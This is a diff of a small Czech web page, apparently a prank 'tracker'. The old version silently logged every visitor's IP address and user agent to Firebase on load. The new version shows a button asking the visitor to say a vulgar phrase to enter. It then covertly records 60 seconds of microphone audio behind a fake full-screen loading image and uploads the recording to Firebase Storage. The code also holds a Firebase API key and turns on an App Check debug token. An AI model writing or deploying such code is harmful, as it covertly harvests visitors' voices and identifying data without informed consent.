@@ -1,29 +1,53 @@
 <!DOCTYPE html>
 <html lang="cs">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>s33yuh</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>s33yuh tracker</title>
   <style>
-    body {
-      background-color: black;
-      color: white;
-      font-family: monospace;
+    html, body {
+      margin: 0; padding: 0;
+      width: 100vw; height: 100vh;
+      background: black;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-size: 3em;
+      font-family: monospace;
+    }
+    button {
+      background: white;
+      color: black;
+      border: none;
+      font-size: 1.2em;
+      padding: 12px 24px;
+      cursor: pointer;
+    }
+    #loading {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: black;
+      z-index: 999;
+    }
+    #loading img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
     }
   </style>
 </head>
 <body>
-  s33yuh
+  <button id="startBtn">pro vstup řekni “hoe suck a dick”</button>
+
+  <div id="loading">
+    <img src="https://images.steamusercontent.com/ugc/2282824741244695971/B71E36C954E1FC3A94B361D973016B75CF7E0A52/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true" alt="Loading..." />
+  </div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
-    import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+    import { initializeAppCheck, DebugAppCheckProvider } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app-check.js";
+    import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyB-RcliC7vlLVsR7arV0Z-Z2ywvFytvwOU",
@@ -35,33 +59,55 @@
       appId: "1:1004328351276:web:549a980def23a4112c8389"
     };
 
+    self.FIREBASE_APPCHECK_DEBUG_TOKEN = true;
     const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
 
-    async function getIP() {
+    initializeAppCheck(app, {
+      provider: new DebugAppCheckProvider(),
+      isTokenAutoRefreshEnabled: true
+    });
+
+    const storage = getStorage(app);
+
+    async function startRecording() {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const filename = `recording_${Date.now()}.webm`;
+        const fileRef = storageRef(storage, `recordings/${filename}`);
+        await uploadBytes(fileRef, blob);
+        console.log('Audio uploaded:', filename);
+      };
+
+      mediaRecorder.start();
+
+      // Loading animace
+      const loading = document.getElementById('loading');
+      loading.style.display = 'block';
+
+      setTimeout(() => {
+        console.log('Loading animation finished');
+        // zatím nic dalšího (žádné přesměrování)
+      }, 10000); // loading 10s
+
+      setTimeout(() => {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      }, 60000); // nahrávání 60s
+    }
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip || 'unknown';
+        await startRecording();
       } catch (e) {
-        return 'unknown';
+        alert('Musíš povolit mikrofon, jinak to nefunguje!');
+        console.error(e);
       }
-    }
-
-    async function logVisit() {
-      const ip = await getIP();
-      const userAgent = navigator.userAgent || 'unknown';
-      const visitRef = ref(db, 'visits');
-      push(visitRef, {
-        ip,
-        userAgent,
-        timestamp: serverTimestamp()
-      }).catch((e) => {
-        console.error('Zápis selhal:', e);
-      });
-    }
-
-    logVisit();
+    });
   </script>
 </body>
 </html>
